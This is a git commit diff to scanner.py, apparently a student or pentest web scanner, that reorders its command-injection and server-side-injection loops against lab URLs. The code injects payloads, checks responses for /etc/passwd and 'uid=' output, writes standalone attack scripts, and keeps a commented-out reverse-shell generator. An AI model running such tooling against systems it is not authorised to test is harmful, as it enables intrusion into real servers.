1a842b5480a22826c97e00be3335a517415282dc
Andy <andy_tan91@hotmail.com>
2018-04-24 00:06:41 +0800

    Tweak command inj and server side inj to stop loop after detection

--- scanner.py
+++ scanner.py
@@ -93,7 +93,7 @@ def scan(url, params):
 	hostname = parts.scheme + "://" + parts.netloc
 	endpoint = parts.path
 
-	'''
+
 	#Command Injection
 	initial_length = ""
 	command_inj_exploitable = "no"
@@ -108,45 +108,43 @@ def scan(url, params):
 
 
 	#Scan for potential command injection vulns
-	for x in commandExecList:
 		for key, value in method_params.items():
-			method_params[key] = x.replace("\n", "")
+			for x in commandExecList:
+				method_params[key] = x.replace("\n", "")
 
+				#response = make_request(method, url, method_params)
+				response = make_auth_request(method, url, method_params, cookie_header)
+				#print response.request.headers
+				#print response.headers;
+				print "\n[*]Scanning for command injection vulnerabilities..."
+				print "[*]Payload used: " + str(method_params)
+				print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
+				print "[*]Response content length: " + str(response.headers['content-length'])
+				print "[*]Response content: \n" + response.content
 
-			#response = make_request(method, url, method_params)
-			response = make_auth_request(method, url, method_params, cookie_header)
-			#print response.request.headers
-			#print response.headers;
+				delta = int(response.headers['content-length']) - int(initial_length)
 
-			print "\n[*]Payload used: " + str(method_params)
-			print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
-			print "[*]Response content length: " + str(response.headers['content-length'])
-			print "[*]Response content: \n" + response.content
+				#Search for specific echo string 'gaw4f4sdaf12f', output of passwd or id command.
+				if response.content.find("root:x:0:0") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1:
+					print "[*]Module is potentially vulnerable to command injection!"
+					command_inj_exploitable = "yes"
+					with open('results.txt', 'a') as result:
+						result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')
+					break
 
-			delta = int(response.headers['content-length']) - int(initial_length)
-
-			#Search for specific echo string 'gaw4f4sdaf12f', output of passwd or id command.
-			if response.content.find("root:x:0:0") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1:
-				print "[*]Module is potentially vulnerable to command injection!"
-				command_inj_exploitable = "yes"
-				with open('results.txt', 'a') as result:
-					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')
-
-			#sleep command is 10 seconds
-			elif response.elapsed.total_seconds() > 10:
-				print "[*]Module is potentially vulnerable to blind command injection!"
-				exploitable = "yes"
-				with open('results.txt', 'a') as result:
-					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')
-
+				#sleep command is 10 seconds
+				elif response.elapsed.total_seconds() > 10:
+					print "[*]Module is potentially vulnerable to blind command injection!"
+					exploitable = "yes"
+					with open('results.txt', 'a') as result:
+						result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')
+					break
 
 			#Generate exploitation script for command injection
 			count = 0
-			exploited = "no"
 			if command_inj_exploitable == "yes":
-				for y in commandExecExploitList:
-						for key, value in method_params.items():
-							if exploited == "no":
+					for key, value in method_params.items():
+						for y in commandExecExploitList:
 								method_params[key] = y.replace("\n", "")
 								#response = make_request(method, url, method_params)
 								response = make_auth_request(method, url, method_params, cookie_header)
@@ -155,7 +153,6 @@ def scan(url, params):
 								print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
 								print "[*]Response content length: " + str(response.headers['content-length'])
 								print "[*]Response content: \n" + response.content
-
 								count=+count+1
 								if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
 									print "[*]Exploit found! Generating standalone attack script..."
@@ -171,29 +168,26 @@ def scan(url, params):
 					 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
 					 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
 					 						exploitFile.write("print response.content")
-									exploited = "yes"
 									break
 
 
-				#Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
-				for z in commandExecExploitRevShellList:
-					for key, value in method_params.items():
-						method_params[key] = z.replace("\n", "")
-						count=+count+1
-						print "[*]Exploit found! Generating standalone attack script (Command injection reverse shell)..."
-					 	with open('command_injection_rev_shell'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
-		 					if method == "POST":
-		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
-		 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params).replace("\\'","'")+')\n')
-		 						exploitFile.write("print response.content")
+					'''
+					#Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
+					for z in commandExecExploitRevShellList:
+						for key, value in method_params.items():
+							method_params[key] = z.replace("\n", "")
+							count=+count+1
+							print "[*]Exploit found! Generating standalone attack script (Command injection reverse shell)..."
+						 	with open('command_injection_rev_shell'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
+			 					if method == "POST":
+			 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
+			 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params).replace("\\'","'")+')\n')
+			 						exploitFile.write("print response.content")
 
-		 					elif method == "GET":
-		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
-		 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
-		 						exploitFile.write("print response.content")
-
-
-
+			 					elif method == "GET":
+			 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
+			 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
+			 						exploitFile.write("print response.content")'''
 
 	#Server Side Injection
 	initial_length = ""
@@ -208,67 +202,64 @@ def scan(url, params):
 		print "[*]Initial response content length: " + str(response.headers['content-length'])
 
 	#Scan for potential vulns
-	for x in serverInjectList:
-		for key, value in method_params.items():
+	for key, value in method_params.items():
+		for x in serverInjectList:
 			method_params[key] = x.replace("\n", "")
+			#response = make_request(method, url, method_params)
+			response = make_auth_request(method, url, method_params, cookie_header)
+			print "\n[*]Scanning for server side injection vulnerabilities..."
+		 	print "[*]Payload used: " + str(method_params)
+		 	print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
+		 	print "[*]Response content length: " + str(response.headers['content-length'])
+			print "[*]Response content: \n" + response.content
 
-		#response = make_request(method, url, method_params)
-		response = make_auth_request(method, url, method_params, cookie_header)
-	 	print "\n[*]Payload used: " + str(method_params)
-	 	print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
-	 	print "[*]Response content length: " + str(response.headers['content-length'])
-		print "[*]Response content: \n" + response.content
+			delta = int(response.headers['content-length']) - int(initial_length)
 
-		delta = int(response.headers['content-length']) - int(initial_length)
+			#Searches for specific echo string vq3rio13dj8x, or output of passwd
+			if response.content.find("root:x:0:0") != -1 or response.content.find("/bin") != -1:
+				print "[*]Module potentially vulnerable to sever side injection!"
+				server_side_exploitable = "yes"
+				with open('results.txt', 'a') as result:
+					result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
+				break
 
-		#Searches for specific echo string vq3rio13dj8x, or output of passwd
-		if response.content.find("root:x:0:0") != -1 or response.content.find("/bin") != -1:
-			print "[*]Module potentially vulnerable to sever side injection!"
-			server_side_exploitable = "yes"
-			with open('results.txt', 'a') as result:
-				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
-			#break
-
-		elif response.elapsed.total_seconds() > 12:
-			print "[*]Vulnerable to blind sever side injection"
-			server_side_exploitable = "yes"
-			with open('results.txt', 'a') as result:
-				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
-			#break
+			elif response.elapsed.total_seconds() > 12:
+				print "[*]Vulnerable to blind sever side injection"
+				server_side_exploitable = "yes"
+				with open('results.txt', 'a') as result:
+					result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
+				break
 
 		#Generate exploitable script for server side injection
 		count = 0
-		exploited = "no"
 		if server_side_exploitable == "yes":
-			for y in serverInjectExploitList:
-				for key, value in method_params.items():
-					if exploited == "no":
-						method_params[key] = y.replace("\n", "")
-						#response = make_request(method, url, method_params)
-						response = make_auth_request(method, url, method_params, cookie_header)
-						print "\n[*]Searching for the correct exploit..."
-						print "[*]Payload used: " + str(method_params)
-						print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
-						print "[*]Response content length: " + str(response.headers['content-length'])
-						print "[*]Response content: \n" + response.content
+			for key, value in method_params.items():
+				for y in serverInjectExploitList:
+					method_params[key] = y.replace("\n", "")
+					#response = make_request(method, url, method_params)
+					response = make_auth_request(method, url, method_params, cookie_header)
+					print "\n[*]Searching for the correct exploit..."
+					print "[*]Payload used: " + str(method_params)
+					print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
+					print "[*]Response content length: " + str(response.headers['content-length'])
+					print "[*]Response content: \n" + response.content
 
+					count=+count+1
 
-						count=+count+1
+					if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
+						print "[*]Exploit found! Generating standalone attack script..."
+						with open('server_side_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
+							if method == "POST":
+								exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
+								exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
+								exploitFile.write("print response.content")
+							elif method == "GET":
+								exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
+								exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
+								exploitFile.write("print response.content")
+						exploited = "yes"
+						break
 
-						if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
-							print "[*]Exploit found! Generating standalone attack script..."
-							with open('server_side_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
-								if method == "POST":
-									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
-									exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
-									exploitFile.write("print response.content")
-								elif method == "GET":
-									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
-									exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
-									exploitFile.write("print response.content")
-							exploited = "yes"
-							break
-'''
 	# Check for open redirects
 	# ========================
 	# 1. Parameter value is contained in redirected URL
@@ -398,8 +389,8 @@ def make_auth_request(method, url, params, cookie):
 
 
 if __name__ == '__main__':
-	scan('http://target.com/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
-	scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
+	#scan('http://target.com/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
+	#scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
 	#scan('http://target.com/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})
-	scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8'}})
+	scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8','domain': '8.8.8.8'}})
 	#scan('http://target.com/serverside/serverside.php', {'GET': {'language': 'apples'}})
